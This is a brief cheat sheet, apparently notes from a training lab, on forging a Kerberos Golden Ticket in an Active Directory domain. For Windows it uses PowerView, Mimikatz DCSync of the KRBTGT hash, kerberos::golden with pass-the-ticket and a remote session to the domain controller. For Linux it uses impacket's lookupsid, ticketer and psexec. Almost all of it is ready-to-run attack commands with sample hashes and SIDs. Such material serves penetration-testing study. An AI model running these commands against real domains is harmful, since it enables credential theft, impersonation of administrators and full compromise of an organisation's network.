Different elements are needed to forge a Golden Ticket:

1. `Domain Name`
2. `Domain SID`
3. `Username to Impersonate`
4. `KRBTGT's hash`


```bash
# Retrieving Domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Running Mimikatz to get the KRBTGT Hash
.\mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:inlanefreight.local

# Forging the Golden Ticket
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt

# List the Golden Ticket in the Current Session
klist

# Using WinRM with the Golden Ticket to Connect to DC01
Enter-PSSession dc01
```



---

## Golden Ticket from Linux 

```bash
# Shtojm IP dhe Domainin host
sudo nano /etc/hosts

# Search for the Domain SID with lookupsid
lookupsid.py inlanefreight.local/pixis@dc01.inlanefreight.local -domain-sids

#Creating the Golden Ticket
ticketer.py -nthash 810d754e118439bab1e1d13216150299 -domain-sid S-1-5-21-2974783224-3764228556-2640795941 -domain inlanefreight.local Administrator

# Importing and Using the Golden Ticket
export KRB5CCNAME=./Administrator.ccache

psexec.py -k -no-pass dc01.inlanefreight.local
```